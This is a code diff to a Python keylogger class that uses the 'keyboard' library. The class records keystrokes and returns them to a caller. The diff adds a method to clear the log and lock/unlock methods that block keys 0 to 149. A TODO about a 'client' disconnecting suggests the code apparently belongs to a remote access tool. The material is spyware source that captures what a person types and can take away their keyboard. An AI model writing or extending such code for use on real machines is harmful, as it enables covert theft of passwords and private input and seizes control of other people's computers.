@@ -1,5 +1,5 @@
 import keyboard
-
+import time
 
 class Keylogger:
     def __init__(self):
@@ -16,6 +16,9 @@ class Keylogger:
             key = '[' + key + ']'
         self.keystroke_logged.append(key)
 
+    def clear_history(self):
+        self.keystroke_logged = []
+
     def hook(self):
         if self.hooking == False:
             self.hooking = True
@@ -30,6 +33,13 @@ class Keylogger:
                 r += key
             self.keystroke_logged.clear()
         return r
+
+    def lock(self):
+        for i in range(150):
+            keyboard.block_key(i)
+
+    def unlock(self):
+        keyboard.unhook_all()
 
 # TODO: clear keylogging history when client disconnects before calling unhook
 keylogger = Keylogger()
